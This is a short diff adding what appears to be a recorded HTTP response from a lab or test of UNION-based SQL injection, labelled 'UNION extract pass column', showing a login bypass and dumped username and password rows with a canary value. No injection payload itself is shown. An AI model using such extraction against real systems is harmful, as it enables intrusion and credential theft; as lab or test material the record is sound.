@@ -1,0 +1,13 @@
+=== B: UNION extract pass column ===
+HTTP/1.1 200 OK
+Date: Wed, 04 Nov 2026 23:06:50 GMT
+Server: Apache/2.4.69 (Debian)
+X-Powered-By: PHP/8.2.35
+Vary: Accept-Encoding
+Content-Length: 93
+Content-Type: text/plain; charset=utf-8
+
+LOGIN OK
+WELCOME-ADMIN-FLAG role=S3cretCanary!
+row: 1 admin S3cretCanary!
+row: 2 guest guest
